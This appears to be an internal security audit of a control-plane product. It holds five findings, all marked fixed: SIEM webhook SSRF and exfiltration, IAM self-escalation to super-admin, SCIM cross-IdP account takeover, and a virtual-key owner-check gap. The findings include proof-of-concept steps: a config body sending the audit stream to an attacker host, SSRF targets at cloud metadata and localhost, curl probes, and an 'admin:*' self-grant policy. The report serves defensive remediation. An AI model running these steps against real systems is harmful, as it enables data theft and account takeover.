## SEC-M6-01 — SIEM webhook config at `audit-log:write` tier exfiltrates the org-wide traffic + admin-audit stream and is an unguarded SSRF vector — **HIGH** (3/3)

> **STATUS: FIXED** (2026-06-09) — three coordinated changes. **(1) Privilege tier:** the egress-mutating verbs (`PUT /settings/siem`, `POST /settings/siem/test`) moved from `audit-log:write` → `settings:write` (the `health:reset` tier), decoupling "read audit logs" from "redirect the audit stream"; read verbs stay on `audit-log:read`. UI Save/Test affordances now gate on `settings:write` (ACTION_MAP + `SettingsSiemTab`), keeping `allowedActions` ↔ `iamMW` in lockstep. **(2) SSRF guard:** the private-IP dial guard was promoted to a single shared source of truth (`packages/shared/transport/http/ssrf.go` — `BlockPrivateDialControl`/`IsDisallowedIP`, `oidcdisco` dedup'd onto it) and installed — scoped per-client, NOT process-wide (CP/Hub still dial their own private deps) — on the CP test-probe client AND the Hub `HTTPSink` egress, so neither path can reach loopback/RFC-1918/link-local/metadata IPs (runs on the resolved address → also defeats DNS-rebinding). **(3) Oracle removal:** `TestSIEMConfig` now returns a generic reachable/unreachable boolean with no `statusCode` and no raw transport-error text. Regression: `TestRegisterSIEMRoutes_MutatingVerbsRequireSettingsWrite`, `TestSiemProbeResult_NoOracle`, `TestTestSIEMConfig_PrivateURL_SSRFBlocked` (CP); `TestHTTPSink_RejectsPrivateURL` (Hub); `TestIsDisallowedIP_RangeMatrix` + `TestBlockPrivateDialControl_*` (shared).

- **Persona:** A5 low-priv-insider-admin (any principal granted `admin:audit-log.write`, e.g. a "SIEM/observability manager" persona)
- **Invariant:** A verb whose intended scope is "manage the SIEM integration record" must not also confer the ability to redirect the entire audit/traffic event stream to an attacker-chosen destination or to make the server issue arbitrary requests to internal hosts.

**Preconditions.** Attacker holds a CP session/API key with `admin:audit-log.write` (a single verb commonly delegated to a non-super-admin observability/compliance manager; it is NOT super-admin-exclusive — `NexusViewer` already carries `audit-log.read`, and write is the natural next grant for whoever owns SIEM setup). SIEM bridge runs on the Hub (default deployment). No `SetGlobalDialControl` SSRF guard is installed in the CP or Hub binaries.

**Attack steps.** 1) Attacker calls `PUT /api/admin/settings/siem` (handler `UpdateSIEMConfig`, gated `iamMW(ResourceAuditLog.Action(VerbWrite))`) with body `{"enabled":true,"url":"https://attacker.tld/collect","format":"json","eventTypes":[...all...]}`. The only URL validation is a `http://`/`https://` prefix check (siem.go:83) — no host allowlist, no private-IP block. 2) The Hub SIEM bridge job (packages/nexus-hub/internal/jobs/defs/audit/siem_bridge.go: "Polls traffic_event and AdminAuditLog ... and forwards them to the configured SIEM sink") re-reads `system_metadata['siem.config']` each poll (default 30s, bridge.go:135) and constructs an HTTPSink (sink.go:46 `NewHTTPSink(cfgRow.URL, cfgRow.Headers, formatter)`) that POSTs every classified `traffic_event` + `AdminAuditLog` row (actor, resource, verb, before/after state) to the attacker URL — a continuous exfiltration of cross-VK traffic metadata and all admin actions. 3) Separately/immediately, attacker calls `POST /api/admin/settings/siem/test` (`TestSIEMConfig`, same `audit-log:write` gate) which makes the CP itself POST to `cfg.URL` (siem.go:130) with no private-IP guard and REFLECTS the upstream status code back to the caller (siem.go:151/154) — a confused-deputy SSRF: target `http://169.254.169.254/...` (cloud metadata), `http://localhost:3060` (Hub internal API), or any internal host, and read liveness/status differentials. The shared http client supports a `DialControl`/`SetGlobalDialControl` private-IP block (packages/shared/transport/http/httpclient.go:114) but it is never installed in CP/Hub — only oidcdisco.go uses a per-dialer `blockPrivateDialControl`, so the SIEM path dials unrestricted.

- **Affected:** packages/control-plane/internal/observability/siem/handler/siem.go:21 (PUT update gated audit-log:write), :22 (test gated audit-log:write), :83 (prefix-only URL validation), :130 (server-side dial of cfg.URL), :151/:154 (status reflection); packages/nexus-hub/internal/observability/siem/sink.go:46 (NewHTTPSink arbitrary URL+headers); packages/nexus-hub/internal/jobs/defs/audit/siem_bridge.go:14 (polls traffic_event + AdminAuditLog → sink); packages/shared/transport/http/httpclient.go:114 (SetGlobalDialControl exists but is never invoked in CP/Hub)
- **Re-check probe.** grep: `rg -n 'settings/siem' packages/control-plane/internal/observability/siem/handler/siem.go` confirms PUT/test still gated only on `ResourceAuditLog.Action(VerbWrite)`. SSRF-guard probe: `rg -n 'SetGlobalDialControl' packages/control-plane packages/nexus-hub | grep -v _test` returning ZERO call sites = guard still inert. Live PoC: with an `audit-log:write`-only token, `curl -X PUT $CP/api/admin/settings/siem -H "Authorization: Bearer $TOK" -d '{"enabled":true,"url":"http://127.0.0.1:3060/healthz"}'` then `curl -X POST $CP/api/admin/settings/siem/test -H "Authorization: Bearer $TOK"` — a 200/`ok:true` reflecting an internal-only service status proves the SSRF; observing the configured URL receive AdminAuditLog rows proves exfiltration.
- **Remediation.** (1) Gate SIEM URL/header mutation and the test probe behind a higher-blast-radius verb (e.g. `settings:write` super-admin or a dedicated `siem:configure` carried only by super-admin), decoupling "read audit logs" from "redirect the audit stream". (2) Install the existing SSRF guard process-wide in both CP and Hub via `SetGlobalDialControl(blockPrivateDialControl)` (or pass `Config.DialControl` to the SIEM test client and the Hub HTTPSink) so SIEM/webhook URLs cannot reach loopback/link-local/RFC1918/metadata IPs; optionally enforce a host allowlist. (3) In `TestSIEMConfig` do not reflect the raw upstream status code/error to the caller — return a generic reachable/unreachable boolean to remove the blind-SSRF oracle.

## SEC-M6-02 — No privilege-ceiling on IAM policy create/update/attach — any delegated `iam-policy.*` or `iam-group.*` holder self-escalates to super-admin — **HIGH** (3/3)

> **STATUS: FIXED** (2026-06-09, jointly with SEC-M6-03) — added an AWS-style grant ceiling (no privilege escalation). New engine primitive `Engine.PrincipalCoversDocument` (`internal/identity/iam/boundary.go`) checks the caller Allow-covers every action a candidate document confers: each Allow statement is expanded across the concrete catalog (`AllActions()`) AND its literal tokens (so `admin:*` / bare `*` / non-catalog identifiers are all bounded), evaluated against the caller's own effective permissions per (action, resource); candidate `Deny`/`Condition` are ignored (conservative — can only reject). Enforced fail-closed (503 nil-engine / 500 eval-error / 403 `PRIVILEGE_ESCALATION_BLOCKED`) at the five conferring chokepoints — `CreateIAMPolicy`, `UpdateIAMPolicy` (on document change), `AttachPrincipalPolicy`, `AttachIAMGroupPolicy`, `AddIAMGroupMember` (checks every policy on the joined group) — via `iam_grant_ceiling.go`. Super-admins pass automatically with no special-casing. A dedicated higher "grant" verb was deliberately NOT added: it closes no attack surface the ceiling does not already close while adding catalog/seed/UI surface (less-is-more). Regression: `TestCovers_*` (8 engine unit tests incl. escalation-blocked, scope-enforced, Deny-ignored, fail-closed) + `TestCreateIAMPolicy_ExceedsCallerCeiling_Returns403`, `TestAttachPrincipalPolicy_ExceedsCallerCeiling_Returns403`, `TestAttachPrincipalPolicy_WithinCeiling_Returns201`, `TestAddIAMGroupMember_PrivilegedGroup_Returns403`, `TestAttachIAMGroupPolicy_ExceedsCallerCeiling_Returns403`. Doc: `iam-identity-architecture.md` §"Grant ceiling".

- **Persona:** A5 low-priv insider admin (holder of a custom "IAM operator" / "user & group admin" role scoped to iam-policy + iam-group CRUD, but NOT full platform admin)
- **Invariant:** A principal must not be able to grant itself (or any principal) permissions exceeding the permissions the granting principal already holds (no-privilege-escalation / grant-ceiling).

**Preconditions.** An organisation has delegated IAM administration by attaching a custom policy granting `admin:iam-policy.*` (or at minimum `iam-policy.create` + `iam-policy.update`) and/or `admin:iam-group.*` to a non-super-admin operator. This is a natural delegation because `iam-policy` and `iam-group` are full-CRUD catalog resources (catalog_data.go:144-145) with no carve-out — the catalog invites granting them to an "IAM operator" persona. The seeded managed roles do NOT grant these (only NexusAdminFullAccess/`admin:*` does), so this is a latent design gap rather than a turnkey exploit against the default seed.

**Attack steps.** 1. The IAM-operator (holding only `iam-policy.*` + `iam-group.*`, e.g. to manage users/roles) calls POST /api/admin/iam/policies (handler CreateIAMPolicy, iam.go:15, gated solely on `iam-policy:create`). The handler (iam_policy_handlers.go:98-125) and store (iam_policy.go:174-183) accept an arbitrary `document` JSON verbatim — there is ZERO validation that the statements are a subset of the caller's own grants. The attacker submits `{"Statement":[{"Effect":"Allow","Action":["admin:*"],"Resource":["*"]}]}`. 2. The attacker calls POST /api/admin/iam/principals/nexus_user/<self-id>/policies (handler AttachPrincipalPolicy, iam.go:35, gated solely on `iam-policy:update`). The handler (iam_attachment_handlers.go:14-55) reads principalType/principalID from path params with no constraint that the target is anyone other than the caller, and no ceiling check. It attaches the all-powerful custom policy to the attacker's own user. 3. AttachPrincipalPolicy then calls revokeUserScope (iam_attachment_handlers.go:48) and InvalidateCache, so on the attacker's next token mint they evaluate as full super-admin (engine Deny>Allow>default-deny in engine.go:179-195 grants the wildcard). Equivalently, via iam-group: the operator creates/updates a group, attaches NexusAdminFullAccess to it (POST /iam/groups/:id/policies, gated only on `iam-group:update`, iam.go:31), and adds themselves as a member (POST /iam/groups/:id/members, also `iam-group:update`, iam.go:29). Net result: a tightly-scoped IAM-management delegation silently equals super-admin.

- **Affected:** packages/control-plane/internal/identity/users/handler/iam_policy_handlers.go:98-125 (CreateIAMPolicy — arbitrary document, no ceiling); packages/control-plane/internal/identity/users/handler/iam_policy_handlers.go:127-179 (UpdateIAMPolicy — arbitrary new document); packages/control-plane/internal/identity/users/handler/iam_attachment_handlers.go:14-55 (AttachPrincipalPolicy — arbitrary principal, no ceiling); packages/control-plane/internal/identity/users/handler/iam.go:15,16,29,31,35 (routes gated only on iam-policy/iam-group create/update); packages/control-plane/internal/identity/users/iamstore/iam_policy.go:174-204 (raw INSERT/UPDATE of document, no guard); packages/shared/identity/iam/catalog_data.go:144-145 (iam-policy & iam-group are full crud() with no escalation carve-out)
- **Re-check probe.** Static: `rg -n 'func .*(CreateIamPolicy|UpdateIamPolicy|AttachPrincipalPolicy)' packages/control-plane/internal/identity/users/iamstore/ packages/control-plane/internal/identity/users/handler/` then confirm none of the bodies call a subset/ceiling check — `rg -n 'subset|ceiling|escalat|grantor|exceedsGrant|isSubsetOf' packages/control-plane/internal/identity` must return ZERO production hits (currently does). Dynamic: as a user holding ONLY a custom policy with `admin:iam-policy.*`+`admin:iam-group.*` (no `admin:*`), POST a policy doc containing `admin:*`/`*`, attach it to self, then GET /api/admin/me/permissions and assert the returned action set did NOT previously include e.g. `admin:credential.read` but now does — escalation succeeded means the guard is missing.
- **Remediation.** Add a grant-ceiling check in CreateIAMPolicy/UpdateIAMPolicy and AttachPrincipalPolicy/AttachIAMGroupPolicy: before persisting/attaching, evaluate every (Action,Resource) the candidate policy document would grant against the CALLING principal's own effective permissions (reuse iamEngine.Evaluate per statement) and reject (403) if any granted permission is not already held by the caller. At minimum, scope `iam-policy.create/update` and `iam-group.update`-with-policy-attach to a dedicated high-tier verb (e.g. carve a `iam-policy.attach`/`grant` verb) and document that these verbs are super-admin-equivalent so operators never delegate them unknowingly. Also forbid attaching a policy whose document is broader than the caller's, and forbid self-attachment of any policy the caller could not already evaluate as Allow.

## SEC-M6-03 — IAM grant operations (attach policy to principal/group, add group member) gated on generic `.update` verb with no permission-boundary check → privilege escalation to super-admin — **HIGH** (3/3)

> **STATUS: FIXED** (2026-06-09, jointly with SEC-M6-02) — the grant ceiling (`Engine.PrincipalCoversDocument`, enforced in `iam_grant_ceiling.go`) is an independent permission-boundary check layered on the existing `iam-policy`/`iam-group` route verbs, so the escalation is closed regardless of which verb a delegated policy granted: `AttachPrincipalPolicy`, `AttachIAMGroupPolicy`, and `AddIAMGroupMember` now require the caller to already hold every permission the attached policy / joined group confers, returning 403 `PRIVILEGE_ESCALATION_BLOCKED` otherwise. The audit-verb-vs-gate-verb mismatch and the separate "grant" verb split were considered and intentionally left as-is — the boundary check is the authoritative control and a verb split adds surface without closing additional attack paths (rationale recorded in `iam-identity-architecture.md` §"Grant ceiling"). See SEC-M6-02 for the full mechanism + regression list.

- **Persona:** A5 low-priv insider admin
- **Invariant:** An administrator must not be able to grant a principal (including itself) any permission the administrator does not itself hold, and privilege-granting operations must be gated on a verb commensurate with their blast radius (not the same generic `.update` used for benign metadata edits).

**Preconditions.** A5 holds a custom (org-authored) IAM policy that grants `admin:iam-policy.update` and/or `admin:iam-group.update` scoped to iam-policy/iam-group resources but deliberately WITHHOLDS the wildcard / `.create` (a natural 'you may manage group memberships and attachments but not author new policies' delegation). The default seed only exposes these verbs via the `admin:*` / `"*"` super-admin wildcard, so the escalation is NOT reachable from a stock low-privilege seeded role — it becomes reachable the moment an operator writes a least-privilege IAM-delegation policy, which is exactly the use case the separate update/create verbs invite. A privileged policy/group (e.g. seeded `NexusSuperAdmin`) exists to target.

**Attack steps.** 1) A5 authenticates with a token carrying only `admin:iam-group.update` (or `admin:iam-policy.update`) + the corresponding `.read`. 2) A5 calls `POST /api/admin/iam/principals/nexus_user/<own-id>/policies` with body `{"policyId":"<NexusSuperAdmin policy id>"}`. The middleware `RequireIAMPermission(engine, ResourceIamPolicy.Action(VerbUpdate), nil)` (route at iam.go:35) evaluates the caller's `iam-policy.update` grant → Allow. The handler `AttachPrincipalPolicy` (iam_attachment_handlers.go:14-55) performs NO check that the caller holds the permissions inside the policy being attached and NO self-target guard; it writes the attachment, invalidates the engine cache, and even revokes the caller's own session (line 48) so the next token mint reflects the new grant. 3) A5 re-authenticates / refreshes; the new token now carries super-admin. Equivalent group path: `POST /api/admin/iam/groups/<privileged-group-id>/members` with `{"principalId":"<own-id>"}` (AddIAMGroupMember, iam_group_handlers.go:134, gated VerbUpdate at iam.go:29) adds A5 to a high-privilege group, or `POST /api/admin/iam/groups/<group-id>/policies` (AttachIAMGroupPolicy, iam_group_handlers.go:188, gated VerbUpdate at iam.go:31) attaches a high-priv policy to a group A5 belongs to. All three operations classify themselves as `VerbCreate` in their own audit entries (iam_attachment_handlers.go:51; iam_group_handlers.go:155; iam_group_handlers.go:219) yet are authorization-gated on `VerbUpdate` — the gate is strictly weaker than the operation's own semantics. The UI reinforces the illusion of safety: the `iam/roles/:id` detail page that surfaces the Attach-Policy / Add-Member buttons is route-gated only on `admin:iam-group.read` (shellRouteConfig.tsx:413) and the buttons themselves are not separately `usePermission`-gated, so an operator reasons about these as ordinary 'edit the group' affordances while the handler grants full escalation.

- **Affected:** packages/control-plane/internal/identity/users/handler/iam.go:35 (POST /iam/principals/:type/:id/policies → ResourceIamPolicy.VerbUpdate); packages/control-plane/internal/identity/users/handler/iam_attachment_handlers.go:14-55 (AttachPrincipalPolicy — no permission-boundary/self-target guard, audits as VerbCreate at :51); packages/control-plane/internal/identity/users/handler/iam.go:29 & :31 (group member/policy attach → ResourceIamGroup.VerbUpdate); packages/control-plane/internal/identity/users/handler/iam_group_handlers.go:134 (AddIAMGroupMember, audits VerbCreate :155) & :188 (AttachIAMGroupPolicy, audits VerbCreate :219); UI gate: packages/control-plane-ui/src/routes/shellRouteConfig.tsx:413
- **Re-check probe.** grep -nE 'iamMW\(iam\.Resource(IamPolicy|IamGroup)\.Action\(iam\.Verb(Update)\)\)' packages/control-plane/internal/identity/users/handler/iam.go — any attach/member route still on VerbUpdate is suspect. Behavioural probe: with a token granting ONLY admin:iam-policy.update (+read), `curl -X POST $CP/api/admin/iam/principals/nexus_user/$SELF/policies -H "Authorization: Bearer $T" -d '{"policyId":"<superadmin-id>"}'` must return 403, not 201. Also assert handlers AttachPrincipalPolicy/AddIAMGroupMember/AttachIAMGroupPolicy contain a caller-holds-target-permissions boundary check (grep for the absence of any 'boundary'/'self'/'caller permissions' guard in iam_attachment_handlers.go + iam_group_handlers.go).
- **Remediation.** Add a permission-boundary check to the three grant handlers: before persisting, load the policy/group's effective action set and verify the calling principal already holds (Allow) every action being granted — deny with 403 otherwise (AWS-style permissions-boundary / no-privilege-escalation). Additionally split the grant operations onto a dedicated, higher verb (e.g. ResourceIamPolicy.VerbGrant / a `manage-attachments` verb) distinct from the generic `.update` used for renames/descriptions, so a delegated `.update` policy cannot silently confer escalation; align the route iamMW verb with the audit-entry verb. Optionally forbid self-targeted attach/add-member outright (caller principalID == path principalID → 403).

## SEC-M6-04 — SCIM User endpoints lack per-IdP ownership scoping — a SCIM token for one IdP can read/modify/suspend ANY Nexus user (cross-IdP account takeover via email change) — **HIGH** (3/3)

> **STATUS: FIXED** (2026-06-09) — added `assertScimUser`, the User-path mirror of the existing `assertScimGroup` guard, called at the top of `GetUser`, `ReplaceUser`, `PatchUser`, and `DeleteUser`. It requires the target user to (1) exist (404), (2) be `source = "scim"` — blocking mutation of local / OIDC-JIT / SAML-JIT admin-managed accounts (403 `mutability`), and (3) when the token is IdP-scoped, be linked to the token's IdP via the `UserFederatedIdentity` table (new `scimstore.UserOwnedByIdP`) — 403 `noPermission` otherwise. `ListUsers` is filtered to the token's IdP through a new `userstore.NexusUserListParams.OwnedByIdP` (`EXISTS` on `UserFederatedIdentity`) so cross-IdP enumeration cannot harvest ids/emails. A global/admin token (no IdP) stays unrestricted, matching the Group path. (Note: the pre-existing `assertScimGroup`/`scimError` pattern returns the error response but `scimError` returns `c.JSON`'s nil — callers must branch on the returned user being nil, the `ownedVKOrDeny` idiom; `assertScimUser` follows it correctly.) Regression: handler `TestGetUser_CrossIdP_Returns403` / `_SameIdP_Returns200`, `TestPatchUser_CrossIdP_Returns403` (email-rewrite takeover), `TestDeleteUser_CrossIdP_Returns403`, `TestPatchUser_LocalAdmin_Returns403`, `TestListUsers_ScopedToTokenIdP` / `_GlobalToken_Unscoped`; store `TestUserOwnedByIdP` + `TestListNexusUsers_OwnedByIdP`. Doc: `idp-sso-architecture.md` §SCIM per-IdP ownership scoping. **This completes FIX-1 (the M6/M7 IAM cluster).**

- **Persona:** A5 low-priv insider admin who can manage a single IdP integration (holds identity-provider:update, mints a SCIM token via POST /identity-providers/:idpId/scim-tokens); equivalently A4 — the external IdP/SCIM client that holds such a token going rogue or compromised.
- **Invariant:** A SCIM bearer token scoped to IdP-A must only read or mutate NexusUsers that were provisioned by / federated to IdP-A; it must never touch users owned by another IdP, local users, or admins.

**Preconditions.** (1) At least one IdP with SCIM provisioning is configured and the attacker can obtain a valid SCIM token for it (an admin with identity-provider:update can mint one; or the external SCIM client is the attacker). (2) Target users (local admins, users from other IdPs) exist in the global NexusUser table. (3) SCIM routes are mounted (RegisterSCIMRoutes).

**Attack steps.** 1. Attacker holds a valid SCIM bearer token for IdP-A. scimAuth (packages/control-plane/internal/identity/scim/handler/scim.go:118-134) only checks the token exists/is unrevoked; it sets c.Set("scimToken", tok) and proceeds — it does NOT constrain which users the token may touch. 2. Attacker enumerates all users: GET /scim/v2/Users — ListUsers (scim.go:179-214) calls h.users.ListNexusUsers with NO filter on tok.IdentityProviderID, returning every user in the system (including local super-admins and users from IdP-B), exposing their internal NexusUser ids and emails. 3. Account takeover: PATCH /scim/v2/Users/<victim-id> with op replace path username (or emails[type eq "work"].value) — PatchUser (scim.go:321-347) → applyUserPatchOp (scim.go:690-704) sets params.Email and calls h.users.UpdateNexusUser(ctx, id, params) with NO IdP-ownership check. The attacker rewrites a target admin's email to one they control; if email is the join key for SSO/password-reset/account-matching this yields takeover. 4. Mass DoS: PATCH active=false (applyUserPatchOp case "active", scim.go:692) or DELETE /scim/v2/Users/<id> (DeleteUser, scim.go:349-359) suspends arbitrary users — including all local super-admins — locking the org out. Contrast the Group path: assertScimGroup (scim.go:475-489) DOES enforce tok.IdentityProviderID == group.identity_provider_id (line 484) and blocks admin-managed groups (line 478). The User handlers have no equivalent assertScimUser, despite the UserFederatedIdentity(userId, idpId) ownership table being populated on CreateUser via LinkUserToIdP (scim.go:278-285).

- **Affected:** packages/control-plane/internal/identity/scim/handler/scim.go:216 (GetUser), :179 (ListUsers), :291 (ReplaceUser), :321 (PatchUser), :349 (DeleteUser) — none consult tok.IdentityProviderID; contrast :475-489 (assertScimGroup, the guard the User path is missing) and :702-704 (email-mutating patch op).
- **Re-check probe.** grep -n 'func (h \*Handler) \(GetUser\|ListUsers\|ReplaceUser\|PatchUser\|DeleteUser\)' packages/control-plane/internal/identity/scim/handler/scim.go then confirm NONE of those function bodies reference IdentityProviderID or call an assertScimUser-style ownership check: `rg -n 'assertScimUser|IdentityProviderID' packages/control-plane/internal/identity/scim/handler/scim.go` — today every IdentityProviderID hit is in CreateUser/CreateGroup/assertScimGroup, none in the User read/update/delete handlers. Regression test: mint a SCIM token for IdP-A, create user U via IdP-A, then with the same token PATCH a user provisioned by IdP-B (or a local 'source=local' admin) — must return 403/404, not 200.
- **Remediation.** Add an assertScimUser(c, ctx, userID, tok) guard mirroring assertScimGroup and call it at the top of GetUser/ReplaceUser/PatchUser/DeleteUser: (1) load the target user; (2) require a UserFederatedIdentity row linking userID to *tok.IdentityProviderID (reuse the scimstore link table) — 403 'token's IdP does not own this user' otherwise; (3) refuse to mutate users whose Source != 'scim' (local/admin accounts are admin-managed, same as the 'admin-managed group' block at scim.go:478). For ListUsers, filter by the token's IdP (join UserFederatedIdentity on idpId) so enumeration cannot cross IdP boundaries.

## SEC-M6-05 — VK approval-workflow handlers (revoke/renew) skip the owner re-check — **MEDIUM** (2/3)
> **STATUS: FIXED** (2026-06-09) — RenewVirtualKey/RevokeVirtualKey now run the same `ownedVKOrDeny` non-super-admin owner re-check the Update/Delete CRUD handlers enforce (fetch the VK, 403 unless caller is its owner or a super-admin). - **Persona:** A5 low-priv insider admin granted a narrow virtual-key:revoke or virtual-key:renew verb (without super-admins group membership).
- **Invariant:** A non-super-admin acting on a virtual key by :id must be the VK's owner; lifecycle mutations must not reach VKs owned by another principal.

**Preconditions.** (1) An IAM policy grants a non-super-admin principal virtual-key:revoke and/or virtual-key:renew. (2) Active application VKs owned by other users/projects exist.

**Attack steps.** 1. The admin CRUD handlers GetVirtualKey/UpdateVirtualKey/DeleteVirtualKey/RegenerateVirtualKey (packages/control-plane/internal/ai/virtualkeys/handler/vk.go:62-67, :185-190, :255-260, :283-288) all re-check ownership for non-super-admins: if vk.OwnerID != aa.KeyID → 403. 2. (Approve/Reject are arguably cross-owner by design — an approver acts on others' requests — so those are excluded; Revoke/Renew are the asymmetric gap vs. Update/Delete.)
